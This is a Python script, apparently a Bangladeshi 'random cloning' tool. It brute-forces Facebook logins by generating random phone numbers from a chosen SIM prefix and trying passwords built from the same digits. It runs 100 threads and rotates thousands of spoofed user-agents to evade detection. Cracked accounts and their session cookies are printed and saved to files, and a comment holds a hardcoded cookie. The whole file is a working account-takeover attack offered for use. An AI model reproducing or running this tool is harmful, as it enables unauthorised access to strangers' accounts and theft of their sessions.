import os,sys,time,json,random,re,string,platform,base64,uuid
from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup
import requests as ress
from datetime import date
from datetime import datetime
from time import sleep
from os import system as s
from time import sleep as waktu
try:
    import requests
    from concurrent.futures import ThreadPoolExecutor as ThreadPool
    import mechanize
    from requests.exceptions import ConnectionError
except ModuleNotFoundError:
    os.system('pip install mechanize requests futures bs4==2 > /dev/null')
    os.system('pip install bs4')
loop = 0
oks = []
cps = []
ugen2=[]
ugen=[]
cokbrut=[]
ses=requests.Session()
ugen=[]
uas=[]
for ua in range(5000):
      a='Mozilla/5.0 (Linux; Android'
      b=random.choice(['5.1.1' , '6.0.1' , '7.1.1' , '12' , '13' , '14' , '15'])
      y=random.choice(['SM-J320H' , 'SM-J3109' , 'J320FN' , 'SM-J320P' , 'SM-J320F' , 'SM-J320G' , 'SM-J320Y'])
      c='Build/LMY47X; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
      d=random.randrange(40,115)
      e='0'
      f=random.randrange(3000,6000)
      g=random.randrange(20,100)
      h='Mobile Safari/537.36'
      ug=(f"{a} {b}; {y} {c}{d}.{e}.{f}.{g} {h}")
      ugen.append(ug)
for ua in range(5000):
    a='NokiaX'
    b=random.randrange(1,9)
    c='-0'
    d=random.randrange(1,9)
    e='/'
    f=random.randrange(1,9)
    g='.0 ('
    h=random.randrange(1,12)
    i='Profile/MIDP-2.1 Configuration/CLDC-1.1'
    j='UNTRUSTED/'
    k=random.randrange(1,3)
    l='.0'
    uaku2=f'{a}{b}{c}{d}{e}{f}{g}{h}{i}{j}{k}{l}'
    ugen.append(uaku2)
os.system("espeak \"Wall come To Mehedi Boss World sir, Bangladesh Random Cloning Start Please Wait\"")
logo=("""
\t\033[38;5;46m║███╗   ███╗\33[38;5;196m███████╗ \033[34;1m██╗  ██╗\033[38;5;46m███████╗\33[38;5;196m██████╗\033[38;5;46m ██╗
\t\033[38;5;46m║████╗ ████║\33[38;5;196m██╔════╝ \033[34;1m██║  ██║\033[38;5;46m██╔════╝\33[38;5;196m██╔══██╗\033[38;5;46m██║
\t\033[38;5;46m║██╔████╔██║\33[38;5;196m█████╗ \033[34;1m  ███████║\033[38;5;46m█████╗  \33[38;5;196m██║  ██║\033[38;5;46m██║
\t\033[38;5;46m║██║╚██╔╝██║\33[38;5;196m██╔══╝ \033[34;1m  ██╔══██║\033[38;5;46m██╔══╝  \33[38;5;196m██║  ██║\033[38;5;46m██║
\t\033[38;5;46m║██║ ╚═╝ ██║\33[38;5;196m███████╗ \033[34;1m██║  ██║\033[38;5;46m███████╗\33[38;5;196m██████╔╝\033[38;5;46m██║
\t\033[38;5;46m║╚═╝     ╚═╝\33[38;5;196m╚══════╝╚═╝ \033[34;1m  ╚═╝╚══════╝╚═════╝ ╚═╝
                                           
\33[38;5;196m     ┏━━━━━━━━━━━━━━━━━━━\033[38;5;46mıllıllı⭐🌟 M͙e͙h͙e͙d͙i͙ 🌟⭐ıllıllı\33[38;5;196m━━━━━━━━━
\33[38;5;196m     ┃ \033[38;5;46m❣︎[𖣘]☔︎\x1b[1;96m𝙉𝘼𝙈𝙀\33[38;5;196m        : [★]𝙈𝙀𝙃𝙀𝘿𝙄\33[38;5;196m         ┃
\33[38;5;196m     ┃ \033[38;5;46m❣︎[𖣘]☔︎\x1b[1;96m𝙁𝘼𝘾𝙀𝘽𝙊𝙊𝙆\33[38;5;196m    : [★]𝙈𝘿 𝙈𝙀𝙃𝙀𝘿𝙄\33[38;5;196m         ┃
\33[38;5;196m     ┃ \033[38;5;46m❣︎[𖣘]☔︎\x1b[1;96m𝙂𝙄𝙏𝙃𝙐𝘽\33[38;5;196m      : [★]𝙈𝙧-𝘿𝙚𝙫𝙞𝙡-404\33[38;5;196m       ┃
\33[38;5;196m     ┃ \033[38;5;46m❣︎[𖣘]☔︎\x1b[1;96m𝙍𝙄𝙇𝙄𝙂𝙀𝙎𝙃𝙊𝙉\33[38;5;196m  : [★]𝗕𝗔𝗡𝗚𝗟𝗔𝗗𝗘𝗦𝗛𝗜\33[38;5;196m        ┃
\33[38;5;196m     ┃ \033[38;5;46m❣︎[𖣘]☔︎\x1b[1;96m𝙒𝙃𝘼𝙏𝙎𝘼𝙋𝙋\33[38;5;196m    : [★]+88001953426804\33[38;5;196m     ┃
\33[38;5;196m     ┃ \033[38;5;46m❣︎[𖣘]☔︎\x1b[1;96m𝙏𝙊𝙊𝙇𝙎 𝙉𝘼𝙈𝙀\33[38;5;196m  : [★]𝗥𝟰𝗡𝗗𝗢𝗠-𝗖𝗟𝗢𝗡𝗜𝗡𝗚\33[38;5;196m     ┃
\33[38;5;196m     ┃ \033[38;5;46m❣︎[𖣘]☔︎\x1b[1;96m𝙏𝙊𝙊𝙇𝙎 𝙎𝙏𝘼𝙏𝙐𝙎\33[38;5;196m: [★]𝗣𝗥𝗘𝗠𝗜𝗨𝗠-𝗩01\33[38;5;196m         ┃
 \33[38;5;196m    ┗━━━━━━━━━━━━━━━━━━━\033[1;31m𝙁𝙄𝙍𝙀\33[38;5;196m━━━━━━━━━━━━━━━━━━━━┛"""
)
A = '\x1b[1;97m' 
B = '\x1b[1;96m' 
C = '\x1b[1;91m' 
D = '\033[38;5;46m'
M = '\033[1;31m'
H = '\033[38;5;46m'
N = '\x1b[1;37m'    
E = '\x1b[1;93m' 
F = '\x1b[1;94m'
G = '\x1b[1;95m'
P = '\033[1;37m'
def fuck():
    user=[]
    os.system('clear')
    os.system('xdg-open https://www.facebook.com/MDMehedi191?mibextid=ZbWKwL/')
    print(logo)
    print('[+] SIM CODE BD=> 016•017•018•019')
    nude = input('\033[1;32m[\033[1;32m?\033[1;32m] SIM CODE : ')
    nudex = ''.join(random.choice(string.digits) for _ in range(2))
    nud = ''.join(random.choice(string.digits) for _ in range(2))
    print('[+] 2000•5000•10000•15000•50000')
    limit = int(input('[?] ENTER YOUR CRACK LIMIT : '))
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(4))
        user.append(nmp)
    with ThreadPool(max_workers=100) as Mehedi:
        os.system('clear')
        print(logo)
        tl = str(len(user))
        print('\033[1;37m[\033[1;32m✓\033[1;32m] SIM CODE : '+nude)
        print('\033[1;37m[\033[1;32m✓\033[1;32m] SOME ID,S WAS LOCKED ')
        print('\033[1;37m[\033[1;32m✓\033[1;32m] TOOL CREATED BY Mehedi JOIN MY GROUP ')
        print('\033[1;37m[\033[1;32m✓\033[1;32m] TOTAL ID : '+tl)
        print('\033[1;32m─────────────────────────────────────────────────────────')
        for guru in user:
            uid = nude+nudex+nud+guru
            pwx = [nude+nudex+nud+guru,nud+guru,nudex+guru,nude+nudex+nud,'bangla']
            Mehedi.submit(rcrack,uid,pwx,tl)
    print('\033[1;32m─────────────────────────────────────────────────────────')
    print('\033[1;37m[\033[1;32m~\033[1;37m] CRACK SUCCESSFULLY COMPLETED..')
    print('\033[1;32m─────────────────────────────────────────────────────────')
def rcrack(uid,pwx,tl):
    global loop
    global cps
    global oks
    global proxy
    try:
        for ps in pwx:
            pro = random.choice(ugen)
            session = requests.Session()
            bi = random.choice([A,B,C,D,E,F,G,H])
            sys.stdout.write(f'\r \033[1;31m[%sMehedi\033[1;31m]\033[1;34m\033[1;31m[\033[38;5;195m%s/%s\033[1;31m]\033[1;34m\033[38;5;45mOK-\033[38;5;46m%s\r'%(bi,loop,tl,len(oks))),
            sys.stdout.flush()
            free_fb = session.get('https://free.facebook.com').text
            log_data = {
                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
            "try_number":"0",
            "unrecognized_tries":"0",
            "email":uid,
            "pass":ps,
            "login":"Log In"}
            header_freefb = {
    'authority': 'm.facebook.com',
    'method': 'GET',
    'scheme': 'https', 
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'en-US,en;q=0.9',
    'cache-control': 'max-age=0',
    # 'cookie': 'datr=npp9ZK8WKQqVIDN2lnWnWahd; dpr=3; sb=tJp9ZB-qCq_FfAdPVE7qAM6v; vpd=v1%3B650x360x3; locale=bn_IN; wl_cbv=v2%3Bclient_version%3A2269%3Btimestamp%3A1686195225; m_pixel_ratio=3; wd=980x1769; fr=0q5MsHKJVnJC5AWkg.AWXNzofGnr2YFVBe6WcILnYaK6M.BkfhRx.7z.AAA.0.0.BkgUxK.AWWGqf0uYaU; sfau=AYgLBl_8pAJeUvkK3Z8I_cEN0qqRCjdq2FpUABJbbEZuZ2zz77xKspQN4tBhAQdBmbzbZ6_-n99MBY-X0gwEI1kPGg4GMRcP2yVA6n6xZCRVsfxrIy3hSsn-L2FGciFY8QwHEsQ6Etb00Jhq0z0eaJ7plsOiQURpohW1bOKABWu7cpjxAkTy0PAYXjAKH58OLtT_W1hNc0VvoNK-N_x5CCgx',
    'sec-ch-prefers-color-scheme': 'light',
    'sec-ch-ua': '"Not:A-Brand";v="99", "Chromium";v="112"',
    'sec-ch-ua-full-version-list': '"Not:A-Brand";v="99.0.0.0", "Chromium";v="112.0.5615.137"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Linux"',
    'sec-ch-ua-platform-version': '""',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': pro,
    'viewport-width': '980',}
            lo = session.post('https://free.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=log_data,headers=header_freefb).text
            log_cookies=session.cookies.get_dict().keys()
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[65:80]
                print(f"\033[38;5;46m[Mehedi-OK💚] {uid} • {ps}" '  \n\033[1;33m [💉]\033[1;33mCookie = \033[1;32m'+coki+  ' \n\033[1;33m [🤧] \033[1;32mUa = \033[1;34m'+pro+'  \033[0;97m')
                open('/sdcard/Mehedi-OK.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(uid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[82:97]
                print(f"\x1b[38;5;196m[Mehedi-CP💔] {uid} • {ps}")
                open('/sdcard/Mehedi-CP.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(uid)
                break
            else:
                continue
        loop+=1
        
    except:
        pass

fuck()